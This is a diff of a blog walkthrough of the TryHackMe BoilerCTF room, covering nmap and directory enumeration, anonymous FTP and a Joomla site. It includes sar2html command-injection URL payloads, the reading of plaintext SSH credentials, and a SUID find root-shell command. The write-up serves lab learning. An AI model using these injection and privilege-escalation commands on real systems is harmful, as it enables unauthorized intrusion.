@@ -6,8 +6,7 @@ tags: [Command Injection, CMS, Enumeration, Sar2HTML]
 ---
 
 # ~$ BoilerCTF walkthrough
-Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here [Tryhackme](https://www.tryhackme.com/room/boilerctf2)
-  I'll walk you through buddy!
+Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here [Tryhackme](https://www.tryhackme.com/room/boilerctf2), I'll walk you through buddy!
 
 ## $Hints
 - Recursive numeration
@@ -45,17 +44,9 @@ Discovered open port 21/tcp on 10.10.47.112
 Increasing send delay for 10.10.47.112 from 0 to 5 due to 874 out of 2184 dropped probes since last increase.
 Increasing send delay for 10.10.47.112 from 5 to 10 due to 11 out of 23 dropped probes since last increase.
 SYN Stealth Scan Timing: About 4.69% done; ETC: 21:25 (0:10:30 remaining)
-SYN Stealth Scan Timing: About 6.53% done; ETC: 21:30 (0:14:33 remaining)
-SYN Stealth Scan Timing: About 8.08% done; ETC: 21:33 (0:17:15 remaining)
-SYN Stealth Scan Timing: About 15.27% done; ETC: 21:31 (0:13:41 remaining)
 SYN Stealth Scan Timing: About 16.23% done; ETC: 21:33 (0:15:19 remaining)
 SYN Stealth Scan Timing: About 17.14% done; ETC: 21:35 (0:16:46 remaining)
 Warning: 10.10.47.112 giving up on port because retransmission cap hit (6).
-SYN Stealth Scan Timing: About 17.63% done; ETC: 21:37 (0:18:32 remaining)
-SYN Stealth Scan Timing: About 24.99% done; ETC: 21:38 (0:17:19 remaining)
-SYN Stealth Scan Timing: About 28.66% done; ETC: 21:37 (0:16:06 remaining)
-SYN Stealth Scan Timing: About 29.34% done; ETC: 21:39 (0:17:16 remaining)
-SYN Stealth Scan Timing: About 32.92% done; ETC: 21:38 (0:16:02 remaining)
 Discovered open port 55007/tcp on 10.10.47.112
 SYN Stealth Scan Timing: About 40.07% done; ETC: 21:39 (0:14:50 remaining)
 SYN Stealth Scan Timing: About 46.19% done; ETC: 21:40 (0:13:36 remaining)
@@ -146,18 +137,21 @@ Nmap done: 1 IP address (1 host up) scanned in 1446.21 seconds
 From our scans we have Ftp, http, ssh(on a rather uncommon port) and Webmin to work with.
 
 We got anon logins from ftp, so I hit the server
-[image](/assets/img/posts/BoilerCTF/boiler-ftp.png)
+  ![image](/assets/img/posts/BoilerCTF/boiler-ftp.png)
+
 A "full"(ls -la) directory listing gave me the .info.txt which was well...pretty useless: 
 ```
 ┌──(azazel㉿azazel)-[~/Tryhackme/BoilerCTF]
 └─$ cat info.txt            
 Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
 ```
-contained a ROT13 encoded text which translated into a humble reminder from [Seth](https://www.tryhackme.com/p/MrSeth6797), on enumreration as the key...
-[image](/assets/img/posts/BoilerCTF/decode.png)
+Contained a ROT13 encoded text which translated into a humble reminder from [Seth](https://www.tryhackme.com/p/MrSeth6797), on enumreration as the key...
+  ![image](/assets/img/posts/BoilerCTF/decode.png)
+  
 How very thoughtful:) Moving on, I decide to check out our buddy on port 80!
 We're greeted with the default Apache landing page, on checking the source I find no suspiscious content, say less::
-![image](/assets/img/posts/dir-enum.png)
+  ![image](/assets/img/posts/BoilerCTF/dir-enum.png)
+  
 Robots.txt tells gives us this info:
 ```
 
@@ -257,40 +251,34 @@ Target: http://10.10.47.112/
 [21:54:14] 301 -  332B  - /joomla/administrator/logs  ->  http://10.10.47.112/joomla/administrator/logs/     (Added to queue)
 [21:54:21] 301 -  335B  - /joomla/administrator/modules  ->  http://10.10.47.112/joomla/administrator/modules/     (Added to queue)
 [21:55:18] 301 -  337B  - /joomla/administrator/templates  ->  http://10.10.47.112/joomla/administrator/templates/     (Added to queue)
-[21:55:44] Starting: joomla/bin/
-[21:57:19] 200 -   31B  - /joomla/bin/index.html
-[22:04:44] Starting: joomla/build/
-[22:07:45] Starting: joomla/cache/
-[22:09:19] 200 -   31B  - /joomla/cache/index.html
-[22:11:10] Starting: joomla/components/
-[22:12:36] 200 -   31B  - /joomla/components/index.html
-[22:14:29] Starting: joomla/images/
-[22:15:03] 301 -  328B  - /joomla/images/banners  ->  http://10.10.47.112/joomla/images/banners/     (Added to queue)
 CTRL+C detected: Pausing threads, please wait...
 ```
-Sheesh, alot of sub directories uhn
-![image](https://giphy.com/gifs/sad-frustrated-steve-harvey-Wv1LRsa2f2afm)
+Sheesh, alot of sub directories uhn?
+  ![image](https://giphy.com/gifs/reaction-JjdKi7cH71Hby)
+
 First thing I checked was this
  ```->  http://10.10.47.112/joomla/administrator/ ```
 
 Which led to a login page, a bruteforce attempt isnt so wise here cause I found a csrf token in the source code(I read up on this and apparently it would hinder an exhaustive search since it expires on first login attempt)
 
 I decided to swiftly visit all the other subdirs to find anything we could leverage to maybe spawn a shell or get ssh keys somehow...
-![iamge](/assets/img/posts/BOILERCTF/dead-end.png) ![image](/assets/img/dead-end2.png) ![image](/assets/code3)
+ ![image](/assets/img/posts/BoilerCTF/dead-end.png)  ![image](/assets/img/posts/BoilerCTF/dead-end2.png)  ![image](/assets/img/posts/BoilerCTF/code3.png)
 
 One of the few encoded texts translated to this ::
-![image](/assets/img/posts/BOILERCTF/decrypt3.png)
+  ![image](/assets/img/posts/BoilerCTF/decrypt3.png)
 
 This machine was taunting me at this point.
-![image](https://giphy.com/gifs/wetv-cant-xTiTngHGyb6C8qMkta)
+  !!!!!!!!!!!!!!!!!!!!!!!
 
-To cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found `` /joomla/_test  ->  http://10.10.47.112/joomla/_test/ ``
-![image]()
+To cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found 
+
+``/joomla/_test  ->  http://10.10.47.112/joomla/_test/ ``
 
 We find a sar2html page out of curiousity::
 _Basically a sar2html is an opensource project that converts sar binary data to graphical html_
-My interest specifically was in exploiting this, on checking exploitdb, an RCE vuln exists for version 3.2.1::
-![image](/assets/img/posts/BOILERCTF/exploit.png)
+
+My interest specifically was in exploiting this... on checking exploitdb, an RCE exploit exists for vulnerable version 3.2.1::
+  ![image](/assets/img/posts/BoilerCTF/exploit.png)
 
 From this exploit:
 ```
@@ -301,24 +289,29 @@ the command you entered. After command injection press "select # host" then your
 output will appear bottom side of the scroll screen.
 ```
 It looks like once we replace the post argument in the query string in the url with a command of our choice, it executes on the system, like a passive command injection!(passive because the results of the executed commands are not directly outputted onto the screen but still executes in the background by the system) Awesome!
+
 To test our exploit::
-![image](/assets/img/posts/BOILERCTF/exploit-use.png)
+![image](/assets/img/posts/BoilerCTF/exploit-use.png)
+
 To reveal the result of our query-inserted command, just click on the "Select Host" option and the drop down will reveal the results of the query which was passed as a system command!
 It also appears to have a weird log.txt document in the current directory when you execute "ls -la" by inserting it like so
 
 ```
 http://<ipaddr>/index.php?plot=;ls -la
 ```
-so just cat log.txt::
+so just cat log.txt::       and click select host to display the command output.
 ```
 http://<ipaddr>/index.php?plot=; cat log.txt
 ```
-![image](/assets/img/posts/BOILERCTF/ssh-creds)
-It looks like the log file contains ssh creds of a user "Basterd" and his pass all in plaintext. Hehee
-![image](https://giphy.com/gifs/happy-laugh-evil-AFlyHDgGqSJO)
+  ![image](/assets/img/posts/BoilerCTF/ssh-creds.png)
 
-_Hackers don't break in, we log in_::
-![image](assets/img/posts/BOILERCTF/initial-access.png)
+It looks like the log file contains ssh creds of a user "Basterd" and his pass all in plaintext. Hehee
+  !!!!!!!
+
+## ~$ Initial Access & Priviledge Escalation::
+### _Hackers don't break in, we log in_::
+  ![image](/assets/img/posts/BoilerCTF/initial-access.png)
+
 In "his" home directory seems there is some sort of backup script that belongs to another use who has a little more priviledges by virtue of SUID bit set for him on the find binary, cat the file and we have his creds, horizontal privesc with with his creds and then navigate to his home directory, the .secret file contains the first flag and then to privesc we have SUID bit set on find
 ```
 find / -type f -perm -4000 2>/dev/null 
@@ -331,8 +324,8 @@ find / -type f -perm -u=s 2>dev/null
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 And spawn a priviledged shell and read our root flag, like so::
-  ![image](/assets/img/posts/BOILERCTF/end.jpg)
+  ![image](/assets/img/posts/BoilerCTF/end.jpg)
 
-Rooted!
+Rooted! This was all sorts of fun
 
-Salaam, [Rami3l](https://www.tryhackme.com/p/Rami3l)
+Salaam, from [Rami3l](https://www.tryhackme.com/p/Rami3l).
